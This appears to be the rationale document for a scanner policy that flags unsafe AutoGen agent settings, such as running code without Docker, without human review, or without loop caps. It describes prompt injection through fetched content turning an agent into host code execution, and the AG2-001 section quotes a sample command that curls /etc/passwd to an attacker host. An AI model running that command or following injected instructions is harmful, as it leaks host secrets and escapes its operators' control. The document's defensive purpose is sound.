---
policy_id: autogen_agent_safety
category: autogen
topic: agent_safety
rules:
  - id: AG2-001
    severity: high
    confidence: 0.9
    scope: agent
    fix_type: config
  - id: AG2-002
    severity: high
    confidence: 0.85
    scope: agent
    fix_type: config
  - id: AG2-004
    severity: low
    confidence: 0.6
    scope: agent
    fix_type: config
  - id: AG2-005
    severity: medium
    confidence: 0.7
    scope: agent
    fix_type: config
  - id: AG2-006
    severity: medium
    confidence: 0.7
    scope: agent
    fix_type: config
references: [LLM05, LLM06, LLM10]
---

# Policy Rationale: AutoGen Agent Safety

**Policy ID:** `autogen_agent_safety`  
**File:** `autogen/agent_safety.yaml`  
**Rules:** AG2-001, AG2-002, AG2-004, AG2-005, AG2-006  
**Severities:** high, high, low, medium, medium  
**Fix types:** config, config, config, config, config  
**References:** LLM05 (Improper Output Handling), LLM06 (Excessive Agency), LLM10 (Unbounded Consumption)

---

## What this policy covers

Agent-scope rules for AutoGen / AG2 agents, read off the constructor kwargs of
`ConversableAgent`, `UserProxyAgent`, `AssistantAgent`, and `GroupChatManager`.
They flag the configurations AutoGen's own docs warn against: code execution on
the host with no Docker (AG2-001), code execution with no human review
(AG2-002), a group-chat loop with no explicit round cap (AG2-004), code execution enabled on the
LLM-facing assistant (AG2-005), and a code-executing agent with no auto-reply cap
(AG2-006). Each uses the `agent_kwarg_value` / `agent_kwarg_present` /
`agent_kwarg_missing` predicates against the constructor call.

---

## Why executor configuration is a distinct concern in AutoGen

AutoGen's design splits two responsibilities: an LLM agent *generates* code, and
a separate executor agent *runs* it. The danger lives in how the executor is
configured, because every code block the model emits flows into it. AutoGen's
documentation is explicit — "we strongly recommend Docker" and "local execution
is not recommended" — and these rules flag the exact settings that defeat that
guidance. With `use_docker=False` (AG2-001), generated code is written to disk and
executed directly on the host with the agent process's privileges; because the
conversation, tool outputs, and retrieved content are all model-reachable, a
single prompt injection becomes host remote code execution with no container to
contain it. `human_input_mode="NEVER"` on a code-executing agent (AG2-002)
removes the last checkpoint before execution, making the agent fully autonomous —
the model's code runs with zero review.

Two more rules guard the generate/execute boundary and the loop bounds.
Collapsing generation and execution into one `AssistantAgent` (AG2-005) means the
agent the model fully controls also runs whatever it produces, removing the review
boundary AutoGen's two-agent pattern exists to provide. And loops that rely on the
framework default instead of an explicit cap are an Unbounded Consumption (LLM10)
hazard with a safety edge: a `GroupChatManager` with no explicit `max_round`
(AG2-004) falls back to AutoGen's built-in default, letting a degenerate
conversation run to that generic ceiling, and a code-executing executor with no
`max_consecutive_auto_reply` (AG2-006) falls back to the class default of 100 — so
a single injected instruction can be amplified across up to that many runs,
multiplying both cost and blast radius.

---

## Rule-by-rule defense

### AG2-001 — Executor runs code on the host without Docker (Severity: high, Confidence: 0.9, Fix type: config)

**What we detect:** a `ConversableAgent` / `UserProxyAgent` with
`code_execution_config={"use_docker": False}` (predicate `agent_kwarg_value` on
`code_execution_config.use_docker`).

**Why it is flaggable:** with Docker disabled, model-generated code runs directly
on the host — no container, no isolation. A prompt injection becomes host RCE,
the exact scenario AutoGen's "strongly recommend Docker" guidance addresses.

**Real-world consequence:** an executor with `use_docker=False` receives an
injected code block that runs `os.system("curl attacker/$(cat /etc/passwd)")` on
the host with the service account's privileges.

**Why severity is high and not critical:** the engine reserves critical for
exposures with no precondition; here the agent must both have code execution
enabled and be reachable by model-influenced input, and the fix is a single
config flip — high reflects a serious, conditional RCE path. **Fix type —
config:** set `use_docker=True` or disable execution, a constructor change.
**Confidence 0.9:** the literal-value match is unambiguous; the small gap covers
an executor whose input is provably never untrusted.

### AG2-002 — Executor runs code with no human review (Severity: high, Confidence: 0.85, Fix type: config)

**What we detect:** an agent with `human_input_mode="NEVER"` AND a
`code_execution_config` present (predicates `agent_kwarg_value` +
`agent_kwarg_present`).

**Why it is flaggable:** the combination makes a code-executing agent fully
autonomous — every emitted code block runs with no human in the loop, so an
injection executes attacker code with no chance to intervene.

**Real-world consequence:** an unattended pipeline runs a code-executing executor
with `human_input_mode="NEVER"`; an injected instruction in a fetched document is
executed without any approval prompt.

**Why severity is high and not critical:** like AG2-001 it requires code
execution to be enabled and reachable; high, not critical, because the precondition
exists and the executor may still run in Docker (limiting the blast radius to the
container). **Fix type — config:** set `human_input_mode` to `ALWAYS`/`TERMINATE`
or disable execution. **Confidence 0.85:** the rule confirms execution is
configured and review is off, but cannot see an out-of-band approval gate the team
may have wired around the agent — a small over-flag.

### AG2-004 — GroupChatManager has no explicit max_round bound (Severity: low, Confidence: 0.6, Fix type: config)

**What we detect:** a `GroupChatManager` (or `GroupChat`) with no `max_round`
kwarg (predicate `agent_kwarg_missing`).

**Why it is flaggable:** with no explicit `max_round` the speaker-selection loop
falls back to AutoGen's built-in default rather than a task-sized cap; a
degenerate conversation runs to that generic ceiling (LLM10), and if participants
hold side-effecting tools the same mutation can be applied repeatedly up to that
bound.

**Real-world consequence:** two agents keep handing a task back and forth because
neither emits the termination signal; the chat burns API budget for hundreds of
rounds before a timeout kills it.

**Why severity is low:** AutoGen already bounds the loop with a built-in default,
so this flags a missing *explicit, task-sized* cap rather than a true runaway — a
hygiene nudge whose usual worst case is a cost/availability incident, and only a
safety problem when looped tools have side effects. **Fix type — config:** pass
`max_round=`. **Confidence 0.8:** a chat wrapped by an external timeout or a
custom loop guard is over-flagged, since the rule sees only the constructor
kwarg.

### AG2-005 — AssistantAgent enables code execution on the LLM agent (Severity: medium, Confidence: 0.7, Fix type: config)

**What we detect:** an `AssistantAgent` with a `code_execution_config` present
(predicate `agent_kwarg_present`).

**Why it is flaggable:** AutoGen's recommended pattern keeps the
`AssistantAgent` at `code_execution_config=False` and routes execution through a
separate `UserProxyAgent`. Enabling execution on the assistant collapses the
generate/execute boundary, so the model-controlled agent also runs its own
output.

**Real-world consequence:** an `AssistantAgent` configured to both generate and
execute is prompt-injected; the injected code runs in the same agent with no
executor review step between generation and execution.

**Why severity is medium and not high:** it is a defense-in-depth/architecture
finding — the assistant's executor may still be Dockered and the risk depends on
that executor's own settings (which AG2-001/002 cover) — so removing the boundary
is a weakening rather than a direct RCE grant. **Fix type — config:** set the
assistant's `code_execution_config=False` and use a dedicated executor.
**Confidence 0.7:** presence of `code_execution_config` does not by itself prove
the execution is unsafe (it may point at a hardened Docker executor), so the rule
over-flags safe two-role setups that happen to set the kwarg on the assistant.

### AG2-006 — Code-executing executor has no auto-reply cap (Severity: medium, Confidence: 0.7, Fix type: config)

**What we detect:** a `ConversableAgent` / `UserProxyAgent` with a
`code_execution_config` present AND no `max_consecutive_auto_reply` kwarg
(predicates `agent_kwarg_present` + `agent_kwarg_missing`).

**Why it is flaggable:** with no explicit `max_consecutive_auto_reply` a
code-executing agent falls back to AutoGen's class default of 100
(MAX_CONSECUTIVE_AUTO_REPLY) — so it can auto-respond, and therefore auto-execute
model code, up to 100 times in one exchange, amplifying the cost and blast radius
of a single injected instruction.

**Real-world consequence:** an executor with no `max_consecutive_auto_reply`
loops on a failing code block, re-executing slightly varied attacker code dozens
of times before anything stops it.

**Why severity is medium and not high:** it is an amplifier of the underlying
code-execution risk (covered by AG2-001/002), not a fresh RCE path on its own;
its impact is the *repetition* (up to the default cap of 100) rather than the
execution itself. **Fix
type — config:** set `max_consecutive_auto_reply=` to a small integer.
**Confidence 0.7:** a deployment that bounds the loop another way (an external
turn limit, a custom reply handler) is over-flagged, since the rule sees only the
constructor.

---

## What this policy does not cover

- Code execution wired by hand inside a tool body rather than via an executor —
  caught by **AG2-010** (code_execution.md), not here.
- Whether the agent's input is actually reachable by untrusted content. All five
  rules flag a configuration, not a proven injection path.
- AG2-005 cannot tell whether the assistant's configured executor is itself
  hardened (Docker, human review) — it flags the boundary collapse regardless.
- Loop bounds enforced outside the constructor (an external timeout, a custom
  speaker-selection or reply handler) are invisible to AG2-004 / AG2-006.
- The newer `autogen-agentchat` (v0.4+) API surface and its
  `CodeExecutorAgent` / executor classes are matched only insofar as discovery
  normalizes them to these agent kinds; configs expressed through a different
  shape may be missed.

---

## Recommendations beyond the fix

```python
from autogen import AssistantAgent, UserProxyAgent

# AutoGen's recommended split: the assistant only generates; a Dockered,
# human-gated, bounded executor runs the code.
assistant = AssistantAgent(
    name="coder",
    llm_config={...},
    code_execution_config=False,          # generation only
)

executor = UserProxyAgent(
    name="executor",
    human_input_mode="ALWAYS",            # a human approves each run
    max_consecutive_auto_reply=3,         # bounded auto-reply loop
    code_execution_config={"use_docker": True, "work_dir": "sandbox"},
)
```

1. Keep generation and execution in separate agents; never set
   `code_execution_config` on the `AssistantAgent`.
2. Run all generated code in Docker (`use_docker=True`) and require human review
   (`human_input_mode="ALWAYS"` or `"TERMINATE"`) on the executor.
3. Bound every loop: set `max_consecutive_auto_reply` on executors and
   `max_round` on group chats, sized to the workflow, paired with a clear
   termination condition so the chat ends on success.
4. If unattended execution is a hard requirement, run the code in a hardened
   external sandbox with no host access rather than via the AutoGen executor.
